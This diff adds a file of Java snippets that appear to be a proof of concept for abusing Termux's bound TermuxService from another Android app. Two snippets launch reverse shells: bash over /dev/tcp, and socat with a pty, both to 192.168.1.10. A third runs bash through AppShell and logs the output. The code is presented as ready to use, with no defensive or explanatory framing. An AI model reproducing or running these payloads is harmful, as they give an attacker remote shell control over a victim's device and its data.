@@ -1,0 +1,94 @@
+==============================================Bash===============================================
+
+public void onServiceConnected(ComponentName name, IBinder binder) {
+    TermuxService.LocalBinder localBinder = (TermuxService.LocalBinder) binder;
+    TermuxService service = localBinder.service;
+    String bash = "/data/data/com.termux/files/usr/bin/bash";
+    String[] args = new String[] {
+        "-c",
+        "exec 196<>/dev/tcp/192.168.1.10/80; /bin/sh <&196 >&196 2>&196"
+    };
+    service.createTermuxTask(bash, args, null, "/data/data/com.termux/files/home");
+}
+
+=================================================================================================
+
+
+
+==============================================Socat==============================================
+
+String socat = "/data/data/com.termux/files/usr/bin/socat";
+String script = "/data/data/com.termux/files/usr/bin/script";
+String bash = "/data/data/com.termux/files/usr/bin/bash";
+String[] args = new String[] {
+    "EXEC:" + script + " -qc " + bash + " /dev/null,pty,stderr",
+    "TCP:192.168.1.10:4444"
+};
+service.createTermuxTask(socat, args, null, "/data/data/com.termux/files/home");
+
+=================================================================================================
+
+
+
+==========================================Command================================================
+
+private ServiceConnection mConnection = new ServiceConnection() {
+        @Override
+        public void onServiceConnected(ComponentName name, IBinder binder) {
+            TermuxService.LocalBinder localBinder = (TermuxService.LocalBinder) binder;
+            TermuxService service = localBinder.service;
+
+            String bash = "/data/data/com.termux/files/usr/bin/bash";
+            String outputPath = "/data/data/com.termux/files/home/output.txt";
+            String[] args = new String[] {
+            	"-c",
+                "--help > '" + outputPath + "' 2>&1"
+            };
+
+            ExecutionCommand command = new ExecutionCommand(
+                TermuxShellManager.getNextShellId(),
+                bash,
+                args,
+                null,
+                "/data/data/com.termux/files/home",
+                ExecutionCommand.Runner.APP_SHELL.getName(),
+                true
+            );
+
+            AppShell.AppShellClient client = new AppShell.AppShellClient() {
+                @Override
+                public void onAppShellExited(AppShell task) {
+                    android.util.Log.d("MY_SHELL", "EXITED");
+                    TermuxShellManager.getShellManager().mTermuxTasks.remove(task);
+
+                    java.io.File f = new java.io.File(outputPath);
+                    if (!f.exists()) {
+                        android.util.Log.e("MY_SHELL", "Output file not found: " + outputPath);
+                        return;
+                    }
+                    StringBuilder sb = new StringBuilder();
+                    try (java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(f))) {
+                        String line;
+                        while ((line = br.readLine()) != null) {
+                            sb.append(line).append('\n');
+                        }
+                        android.util.Log.d("MY_SHELL", "FILE OUTPUT:\n" + sb.toString());
+                    } catch (Exception e) {
+                        android.util.Log.e("MY_SHELL", "Failed to read output file", e);
+                    }
+                }
+            };
+
+            AppShell task = AppShell.execute(service, command, client, new TermuxShellEnvironment(), null, true);
+            if (task != null) {
+                TermuxShellManager.getShellManager().mTermuxTasks.add(task);
+            } else {
+                android.util.Log.e("MY_SHELL", "Failed to start AppShell");
+            }
+        }
+
+        @Override
+        public void onServiceDisconnected(ComponentName componentName) { }
+    };
+    
+==================================================================================================================
